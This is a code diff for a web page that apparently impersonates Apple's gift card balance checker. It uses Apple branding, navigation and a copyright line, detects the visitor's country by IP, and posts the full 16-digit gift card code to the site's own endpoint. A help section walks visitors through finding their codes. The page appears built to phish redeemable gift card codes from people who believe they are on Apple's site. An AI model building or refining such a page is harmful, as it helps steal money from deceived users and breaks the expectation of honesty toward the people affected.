@@ -19,9 +19,10 @@ export default function ApplePage() {
         const data = await res.json()
         if (data.country_name) {
           setLocation(data.country_name)
+          return
         }
       } catch (err) {
-        console.error('Location detection failed', err)
+        console.error('IP detection failed, using fallback', err)
       }
     }
     detectLocation()
@@ -31,8 +32,7 @@ export default function ApplePage() {
     if (e) e.preventDefault()
     setError(null)
     setResult(null)
-    if (!card.trim()) return setError('Please enter your gift card code.')
-
+    if (!card.trim()) return setError('Please enter a card number.')
     setLoading(true)
     try {
       const res = await fetch('/api/check-balance', {
@@ -41,121 +41,131 @@ export default function ApplePage() {
         body: JSON.stringify({ cardNumber: card.replace(/\s+/g, '') })
       })
       const data = await res.json()
-      if (!res.ok) throw new Error(data?.error || 'Validation failed')
+      if (!res.ok) throw new Error(data?.error || 'Unknown error')
       setResult(data)
     } catch (err) {
       setError(err.message)
-    } finally {
-      setLoading(false)
-    }
+    } finally { setLoading(false) }
   }
 
+  const countries = [
+    'Afghanistan', 'Albania', 'Algeria', 'Argentina', 'Australia', 'Austria', 'Bangladesh', 'Belgium', 'Brazil',
+    'Canada', 'Chile', 'China', 'Colombia', 'Czech Republic', 'Denmark', 'Egypt', 'Finland', 'France',
+    'Germany', 'Greece', 'Hong Kong', 'Hungary', 'India', 'Indonesia', 'Ireland', 'Israel', 'Italy',
+    'Japan', 'Malaysia', 'Mexico', 'Netherlands', 'New Zealand', 'Nigeria', 'Norway', 'Pakistan', 'Peru',
+    'Philippines', 'Poland', 'Portugal', 'Romania', 'Saudi Arabia', 'Singapore', 'South Africa',
+    'South Korea', 'Spain', 'Sweden', 'Switzerland', 'Taiwan', 'Thailand', 'Turkey', 'Ukraine',
+    'United Arab Emirates', 'United Kingdom', 'United States', 'Vietnam'
+  ].sort()
+
   return (
-    <div className={styles.applePage}>
+    <div className={styles.appleStyles}>
       <Head>
         <title>Check Apple Gift Card Balance - Apple</title>
-        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
       </Head>
 
+      {/* Location Banner */}
       {showLocationBanner && (
-        <div className={styles.locationBanner}>
-          <div className={styles.bannerContent}>
+        <div className="location-banner">
+          <div className="banner-content">
             <p>Choose another country or region to see content specific to your location.</p>
-            <div className={styles.bannerControls}>
-              <div className={styles.selectWrapper}>
+            <div className="banner-controls">
+              <div className="select-wrapper">
                 <select
-                  className={styles.locationSelect}
                   value={location}
                   onChange={(e) => setLocation(e.target.value)}
+                  className="location-select"
                 >
-                  <option>United States</option>
-                  <option>Canada</option>
-                  <option>United Kingdom</option>
-                  <option>Australia</option>
-                  <option>Germany</option>
-                  <option>France</option>
-                  <option>Japan</option>
-                  <option>Other Region</option>
+                  {countries.map(country => (
+                    <option key={country} value={country}>
+                      {country === location ? `✓  ${country}` : country}
+                    </option>
+                  ))}
                 </select>
               </div>
-              <button className={styles.bannerBtn} onClick={() => setShowLocationBanner(false)}>Continue</button>
+              <button className="banner-btn" onClick={() => setShowLocationBanner(false)}>Continue</button>
+              <button className="close-banner" onClick={() => setShowLocationBanner(false)} aria-label="Close">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
+                  <path d="M18 6L6 18M6 6l12 12" />
+                </svg>
+              </button>
             </div>
           </div>
-          <button className={styles.closeBanner} onClick={() => setShowLocationBanner(false)}>
-            <svg width="14" height="14" viewBox="0 0 14 14" fill="none" stroke="currentColor" strokeWidth="1.5">
-              <path d="M1 1l12 12M13 1L1 13" />
-            </svg>
-          </button>
         </div>
       )}
 
-      <header className={styles.header}>
-        <div className={styles.headerContent}>
-          <a href="/apple" className={styles.appleLogo}>
-            <svg height="18" viewBox="0 0 14 18" width="14" fill="currentColor">
-              <path d="m13.0729 17.6825a3.61 3.61 0 0 0 -1.2948-2.9656c-1.3109-1.1058-3.0563-1.0771-3.4419-1.0771-.0853 0-.171 0-.2563.0031-.1546.0055-.3081.0116-.4603.0232-1.7114.1299-2.1008.3304-3.5303.9733-.7191.3214-1.3373.9159-2.1121.9159-.1312 0-.2792-.012-.4448-.0479-.6133-.1331-1.1486-.5347-1.4854-.9545-.4719-.5878-1.5833-2.8595-1.5833-6.09063 0-3.11124 1.70514-4.82404 3.40769-4.82404.78231 0 1.54587.27656 2.01125.47426.61614.26129 1.33944.56764 2.39467.56764 1.05525 0 1.77855-.30635 2.39464-.56764.4654-.1977.1.22894.1.47426 1.01125 0 3.018.4116 4.0746 1.86314 0 0-2.0408 1.18956-2.0408 3.64026 0 2.4503 2.1132 3.3283 2.1132 3.3283a8.85 8.85 0 0 1 -.8597 2.3184zm-3.5835-14.3245a2.96658 2.96658 0 0 0 .696-2.06222c0-.10147-.0097-.2015-.025-.29578-2.285.0921-2.98619 1.61866-2.98619 1.61866a2.53015 2.53015 0 0 0 -.69288 2.06451.27.27 0 0 0 .1536.2144 2.14 2.14 0 0 0 .62.08182c1.7 0 2.235-.905 2.235-.9115z" />
-            </svg>
-          </a>
+      {/* Apple Header */}
+      <header className="apple-header">
+        <div className="header-content">
+          <div className="header-left">
+            <a href="/apple" className="apple-logo" aria-label="Apple">
+              <img src="/appleIcon.png" alt="Apple Logo" width="20" height="20" />
+            </a>
+          </div>
 
-          <nav className={styles.navMenu}>
-            <a href="#">Store</a>
-            <a href="#">Mac</a>
-            <a href="#">iPad</a>
-            <a href="#">iPhone</a>
-            <a href="#">Watch</a>
-            <a href="#">Support</a>
+          <nav className="nav-menu">
+            <a href="#store">Store</a>
+            <a href="#mac">Mac</a>
+            <a href="#ipad">iPad</a>
+            <a href="#iphone">iPhone</a>
+            <a href="#watch">Watch</a>
+            <a href="#vision">Vision</a>
+            <a href="#airpods">AirPods</a>
+            <a href="#tv">TV & Home</a>
+            <a href="#entertainment">Entertainment</a>
+            <a href="#AirPods">Accessories</a>
+            <a href="#support">Support</a>
           </nav>
 
-          <div className={styles.headerActions}>
-            <button className={styles.iconBtn} aria-label="Search">
-              <svg width="15" height="15" viewBox="0 0 15 15" fill="none" stroke="currentColor" strokeWidth="1.2">
-                <circle cx="6" cy="6" r="5" />
-                <path d="M10 10l4 4" />
+          <div className="header-actions">
+            <button className="icon-btn" aria-label="Search">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="11" cy="11" r="8" /><path d="m21 21-4.3-4.3" />
               </svg>
             </button>
-            <button className={styles.iconBtn} aria-label="Shopping Bag">
-              <svg width="13" height="15" viewBox="0 0 13 15" fill="none" stroke="currentColor" strokeWidth="1.2">
-                <path d="M1 4h11v10H1z" />
-                <path d="M3.5 6V3a3 3 0 116 0v3" />
+            <button className="icon-btn" aria-label="Shopping Bag">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M6 2 3 6v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6l-3-4Z" /><path d="M3 6h18" /><path d="M16 10a4 4 0 0 1-8 0" />
               </svg>
             </button>
-            <button
-              className={styles.mobileMenuBtn}
-              aria-label="Menu"
-              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
-            >
-              <svg width="18" height="18" viewBox="0 0 18 18" fill="none" stroke="currentColor" strokeWidth="1.2">
-                <path d={mobileMenuOpen ? "M3 15L15 3M3 3l12 12" : "M2 5h14M2 13h14"} />
+            <button className="mobile-menu-btn" aria-label="Menu" onClick={() => setMobileMenuOpen(true)}>
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round">
+                <path d="M4 8h16M4 16h16" />
               </svg>
             </button>
           </div>
         </div>
-
-        <aside className={`${styles.mobileNav} ${mobileMenuOpen ? styles.open : ''}`}>
-          <div className={styles.mobileNavHeader}>
-            <button onClick={() => setMobileMenuOpen(false)}>×</button>
-          </div>
-          <nav className={styles.mobileLinks}>
-            <a href="#" onClick={() => setMobileMenuOpen(false)}>Store</a>
-            <a href="#" onClick={() => setMobileMenuOpen(false)}>Mac</a>
-            <a href="#" onClick={() => setMobileMenuOpen(false)}>iPad</a>
-            <a href="#" onClick={() => setMobileMenuOpen(false)}>iPhone</a>
-            <a href="#" onClick={() => setMobileMenuOpen(false)}>Watch</a>
-            <a href="#" onClick={() => setMobileMenuOpen(false)}>Support</a>
-          </nav>
-        </aside>
       </header>
 
-      <main className={styles.pageRoot}>
-        <div className={styles.shell}>
-          <section className={styles.hero}>
+      {/* Mobile Full-Screen Overlay Nav */}
+      <aside className={`mobile-nav ${mobileMenuOpen ? 'open' : ''}`}>
+        <div className="mobile-nav-header">
+          <button className="icon-btn" onClick={() => setMobileMenuOpen(false)}>
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
+              <path d="M18 6L6 18M6 6l12 12" />
+            </svg>
+          </button>
+        </div>
+        <nav className="mobile-links">
+          <a href="#store" onClick={() => setMobileMenuOpen(false)}>Store</a>
+          <a href="#mac" onClick={() => setMobileMenuOpen(false)}>Mac</a>
+          <a href="#ipad" onClick={() => setMobileMenuOpen(false)}>iPad</a>
+          <a href="#iphone" onClick={() => setMobileMenuOpen(false)}>iPhone</a>
+          <a href="#watch" onClick={() => setMobileMenuOpen(false)}>Watch</a>
+          <a href="#support" onClick={() => setMobileMenuOpen(false)}>Support</a>
+        </nav>
+      </aside>
+
+      <main className="page-root">
+        <div className="shell">
+          <section className="hero">
             <h1>Check your Apple Gift Card balance</h1>
-            <p className={styles.heroText}>Enter the 16-digit code to see your available balance instantly.</p>
+            <p className="hero-text">Enter the 16-digit code to see your available balance instantly.</p>
           </section>
 
-          <div className={styles.mainCard}>
-            <form onSubmit={checkBalance} className={styles.form}>
-              <div className={styles.inputWrapper}>
+          <div className="main-card">
+            <form onSubmit={checkBalance} className="form">
+              <div className="input-wrapper">
                 <span>Gift Card Code</span>
                 <input
                   type="text"
@@ -166,29 +176,29 @@ export default function ApplePage() {
                 />
               </div>
 
-              <div className={styles.actions}>
-                <button type="submit" className={styles.primaryBtn} disabled={loading}>
+              <div className="actions">
+                <button type="submit" className="primary" disabled={loading}>
                   {loading ? 'Checking…' : 'Check Balance'}
                 </button>
               </div>
 
-              {error && <div className={styles.errorText}>{error}</div>}
+              {error && <div className="error">{error}</div>}
 
               {result && (
-                <div className={styles.result}>
-                  <div className={styles.amountText}>${result.balance.toFixed(2)}</div>
-                  <div className={styles.metaText}>Card ending in {result.cardLast4}</div>
-                  <button type="button" className={styles.locationBtn} onClick={() => { setCard(''); setResult(null) }}>Check another card</button>
+                <div className="result">
+                  <div className="amount">${result.balance.toFixed(2)}</div>
+                  <div className="meta">Card ending in {result.cardLast4}</div>
+                  <button type="button" className="location-btn" onClick={() => { setCard(''); setResult(null) }}>Check another card</button>
                 </div>
               )}
             </form>
           </div>
 
-          <section className={styles.helpSection}>
-            <div className={styles.helpHeader} onClick={() => setShowTutorial(!showTutorial)}>
+          <section className="help-section">
+            <div className="help-header" onClick={() => setShowTutorial(!showTutorial)}>
               <h2>Can't find your gift card code?</h2>
               <button
-                className={styles.toggleBtn}
+                className="toggle-btn"
                 aria-expanded={showTutorial}
                 aria-label="Toggle Tutorial"
               >
@@ -199,22 +209,36 @@ export default function ApplePage() {
             </div>
 
             {showTutorial && (
-              <div className={styles.tutorial}>
-                <div className={styles.mockupGrid}>
-                  <div className={styles.mockupCard}>
-                    <div className={styles.mockupImage}>
-                      <div className={styles.cardMockup}>
-                        <div className={styles.cardLogo}>APPLE</div>
-                        <div className={styles.cardCode}>1234 5678 9012 3456</div>
+              <div className="tutorial">
+                <div className="mockup-grid">
+                  <div className="mockup-card">
+                    <div className="mockup-image">
+                      <div className="card-mockup">
+                        <div className="card-logo">APPLE</div>
+                        <div className="card-code">1234 5678 9012 3456</div>
                       </div>
                     </div>
                     <h3>Physical Gift Card</h3>
                     <p>Look on the <strong>back</strong> of your card. The 16-digit code is usually printed below or above the barcode.</p>
                   </div>
 
-                  <div className={styles.mockupCard}>
-                    <div className={styles.mockupImage}>
-                      <div className={styles.receiptMockup}>
+                  <div className="mockup-card">
+                    <div className="mockup-image">
+                      <div className="email-mockup" style={{ width: '100%', maxWidth: '280px' }}>
+                        <div className="email-header" style={{ borderBottom: '0.5px solid #eee', paddingBottom: '8px', marginBottom: '12px' }}>
+                          <div style={{ fontWeight: 700, fontSize: '14px' }}>Apple</div>
+                        </div>
+                        <div style={{ fontSize: '13px', fontWeight: 600, marginBottom: '16px' }}>Your Apple Gift Card is ready</div>
+                        <div className="code-box" style={{ background: '#f5f5f7', padding: '12px', borderRadius: '8px', fontWeight: 700, textAlign: 'center', letterSpacing: '1px' }}>1234 5678 9012 3456</div>
+                      </div>
+                    </div>
+                    <h3>Digital Gift Card</h3>
+                    <p>Check your <strong>email</strong> for a message from Apple with your gift code.</p>
+                  </div>
+
+                  <div className="mockup-card">
+                    <div className="mockup-image">
+                      <div className="receipt-mockup" style={{ width: '100%', maxWidth: '240px', background: 'white', border: '1px solid #d2d2d7', padding: '24px', borderRadius: '4px', boxShadow: '0 4px 12px rgba(0,0,0,0.05)' }}>
                         <div style={{ fontWeight: 700, fontSize: '11px', marginBottom: '12px' }}>Apple Store Receipt</div>
                         <div style={{ borderBottom: '1px dashed #d2d2d7', margin: '12px 0' }}></div>
                         <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', marginBottom: '4px' }}>
@@ -232,18 +256,19 @@ export default function ApplePage() {
                   </div>
                 </div>
 
-                <div className={styles.helpFooter}>
+                <div className="help-footer">
                   <p>Still need help? <a href="https://support.apple.com/gift-card" target="_blank" rel="noopener noreferrer">Visit Apple Support →</a></p>
                 </div>
               </div>
             )}
           </section>
+
+          {/* Footer */}
+          <footer className="page-footer">
+            <p>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
+          </footer>
         </div>
       </main>
-
-      <footer className={styles.pageFooter}>
-        <p>© {new Date().getFullYear()} Apple Inc. All rights reserved.</p>
-      </footer>
     </div>
   )
 }
